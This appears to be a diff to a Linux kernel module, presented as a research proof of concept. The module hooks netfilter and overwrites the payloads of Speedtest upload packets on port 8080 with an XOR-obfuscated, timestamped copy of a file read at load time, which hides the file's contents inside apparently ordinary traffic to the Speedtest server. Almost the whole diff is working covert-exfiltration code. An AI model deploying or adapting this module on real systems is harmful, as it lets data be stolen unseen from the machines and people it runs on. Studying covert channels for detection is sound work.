@@ -1,6 +1,6 @@
 
 /*
-This LKM modifies TCP PSH/ACK packets over port 8080 to exfiltrate data from a client machine during a Speedtest. 
+This LKM modifies TCP PSH/ACK packets over port 8080 to exfiltrate data from a client machine during a Speedtest.
 This code should work with any Ookla Speedtest server using HTTP (e.g. http://speedtest.midco.net).
 Tested on Ubuntu 24.04 with version 6.8 kernel.
 
@@ -26,6 +26,7 @@ Tested on Ubuntu 24.04 with version 6.8 kernel.
 #include <linux/file.h>
 #include <linux/fs.h>
 #include <linux/timekeeping.h>
+#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Janessa Palmieri");
@@ -42,60 +43,37 @@ MODULE_DESCRIPTION("Kernel module to modify Speedtest packets.");
 #define SEARCH_STR_POST "POST"
 #define SEARCH_LEN_POST 4
 
+#define MAX_FILE_SIZE 1400
+
 //total number of bytes exfiled
 static unsigned long total_exfiled_bytes = 0;
 
 //netfilter hook options
-static struct nf_hook_ops *nfho = NULL; 
+static struct nf_hook_ops *nfho = NULL;
+
+//file data read at module load time
+static char *file_data = NULL;
+static int file_data_len = 0;
 
 //function that demonstrates the exfiltration of a test file.
 static unsigned int exfil_file(struct sk_buff *skb, int offset, int payload_len) {
-    struct file *testfile;
-    char *buffer;
     char *stamped;
-    loff_t pos = 0;
-    ssize_t bytes_read;
     int max_data = payload_len - 6; //6 header bytes: 4 timestamp + 2 length
+    int send_len;
     int i;
     time64_t ts;
     u32 ts32;
     u8 ts_bytes[4];
 
-    if (max_data <= 0)
+    if (max_data <= 0 || file_data == NULL || file_data_len == 0)
         return NF_ACCEPT;
 
-    if (max_data > 1400)
-        max_data = 1400;
+    //how many bytes of file data we can fit
+    send_len = min(file_data_len, max_data);
 
-    //allocate buffers on heap to avoid kernel stack overflow
-    buffer = kmalloc(max_data + 1, GFP_ATOMIC);
-    if (!buffer)
+    stamped = kmalloc(6 + send_len, GFP_ATOMIC);
+    if (!stamped)
         return NF_ACCEPT;
-
-    stamped = kmalloc(6 + max_data, GFP_ATOMIC);
-    if (!stamped) {
-        kfree(buffer);
-        return NF_ACCEPT;
-    }
-
-    //Open the file
-    testfile = filp_open(TEST_FILE, O_RDONLY, 0);
-    if (IS_ERR(testfile)) {
-        kfree(buffer);
-        kfree(stamped);
-        return NF_ACCEPT;
-    }
-
-    //Read from the file, capped at payload space and buffer size
-    bytes_read = kernel_read(testfile, buffer, max_data, &pos);
-    if (bytes_read < 0) {
-        filp_close(testfile, NULL);
-        kfree(buffer);
-        kfree(stamped);
-        return NF_ACCEPT;
-    }
-    buffer[bytes_read] = '\0';
-    filp_close(testfile, NULL);
 
     //build stamped payload: [4 bytes ts][2 bytes len][xor'd content]
     ts = ktime_get_real_seconds();
@@ -106,20 +84,19 @@ static unsigned int exfil_file(struct sk_buff *skb, int offset, int payload_len)
     ts_bytes[3] = (ts32 >> 24) & 0xFF;
 
     memcpy(stamped, ts_bytes, 4);
-    stamped[4] = (bytes_read >> 8) & 0xFF;
-    stamped[5] = bytes_read & 0xFF;
+    stamped[4] = (send_len >> 8) & 0xFF;
+    stamped[5] = send_len & 0xFF;
 
-    for (i = 0; i < bytes_read; i++)
-        stamped[6 + i] = buffer[i] ^ ts_bytes[i % 4];
+    for (i = 0; i < send_len; i++)
+        stamped[6 + i] = file_data[i] ^ ts_bytes[i % 4];
 
-    skb_store_bits(skb, offset, stamped, 6 + bytes_read);
+    skb_store_bits(skb, offset, stamped, 6 + send_len);
 
-    kfree(buffer);
     kfree(stamped);
     return NF_ACCEPT;
-
 }
-//function that overwrites the TCP payload with random bytes and calculates the maximum number of bytes that can be exfiltrated in a single speedtest. 
+
+//function that overwrites the TCP payload with random bytes and calculates the maximum number of bytes that can be exfiltrated in a single speedtest.
 static unsigned int max_bytes_exfiled(struct sk_buff *skb, int offset, int len) {
     int i;
     char random;
@@ -129,12 +106,13 @@ static unsigned int max_bytes_exfiled(struct sk_buff *skb, int offset, int len) 
         random = get_random_u32();
         skb_store_bits(skb, offset + i, &random, 1);
     }
-    
+
     //add up TCP payload lengths
     total_exfiled_bytes += len;
     return NF_ACCEPT;
 }
-//hook function that filters on the PSH/ACK upload speed packets, calls PoC functions, and recalculates checksums. 
+
+//hook function that filters on the PSH/ACK upload speed packets, calls PoC functions, and recalculates checksums.
 static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
 
 	struct iphdr *ip_header;
@@ -153,7 +131,7 @@ static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_h
 	__be32 client_ip = in_aton(ip_source);
 
 	//check if packet is valid
-	if (!skb)			
+	if (!skb)
 		return NF_ACCEPT;
 
 	//ensure linear data
@@ -161,15 +139,15 @@ static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_h
 		return -ENOMEM;
 
 	//extract ip header
-	ip_header = ip_hdr(skb);	
+	ip_header = ip_hdr(skb);
 	ip_hdr_len = ip_header->ihl * 4;
 
 	//only process tcp packets
-	if (ip_header->protocol != IPPROTO_TCP) 
+	if (ip_header->protocol != IPPROTO_TCP)
 		return NF_ACCEPT;
 
 	//extract tcp header
-	tcp_header = tcp_hdr(skb);	
+	tcp_header = tcp_hdr(skb);
 	tcp_hdr_len = tcp_header->doff * 4;
 
 	//extract src ip addr
@@ -189,7 +167,7 @@ static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_h
 		 total_len > 1500) {
 
 		//integer offset of TCP payload
-		tcp_payloadoffset = ip_hdr_len + tcp_hdr_len; 
+		tcp_payloadoffset = ip_hdr_len + tcp_hdr_len;
 
 		//grab pointer to start of TCP payload
 		payload_pointer = (unsigned char*)tcp_header + tcp_hdr_len;
@@ -207,7 +185,7 @@ static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_h
 
 		//call function that overwrites entire TCP payload with random bytes and calculates the max amount of bytes that can be exfiled in a single Speedtest
         //max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);
-       
+
         //zero out checksum
         tcp_header->check = 0;
 
@@ -228,8 +206,39 @@ static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_h
 	}
 	return NF_ACCEPT;
 }
+
 static int __init LKM_init(void)
 {
+    struct file *testfile;
+    loff_t pos = 0;
+    ssize_t bytes_read;
+
+    //read file into global buffer at load time (safe process context)
+    file_data = kmalloc(MAX_FILE_SIZE, GFP_KERNEL);
+    if (!file_data)
+        return -ENOMEM;
+
+    testfile = filp_open(TEST_FILE, O_RDONLY, 0);
+    if (IS_ERR(testfile)) {
+        pr_err("exfil: failed to open %s\n", TEST_FILE);
+        kfree(file_data);
+        file_data = NULL;
+        return PTR_ERR(testfile);
+    }
+
+    bytes_read = kernel_read(testfile, file_data, MAX_FILE_SIZE - 1, &pos);
+    filp_close(testfile, NULL);
+
+    if (bytes_read < 0) {
+        pr_err("exfil: failed to read %s\n", TEST_FILE);
+        kfree(file_data);
+        file_data = NULL;
+        return bytes_read;
+    }
+
+    file_data[bytes_read] = '\0';
+    file_data_len = bytes_read;
+
 	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
 
 	// Initialize netfilter hook
@@ -241,9 +250,11 @@ static int __init LKM_init(void)
 	nf_register_net_hook(&init_net, nfho);
 	return 0;
 }
+
 static void __exit LKM_exit(void)
 {
 	nf_unregister_net_hook(&init_net, nfho);
+    kfree(file_data);
 //	pr_info("Total bytes exfiled: %lu bytes (%lu.%lu MB)\n", total_exfiled_bytes, total_exfiled_bytes / 1000000, (total_exfiled_bytes % 1000000) / 100000);
 }
 module_init(LKM_init);
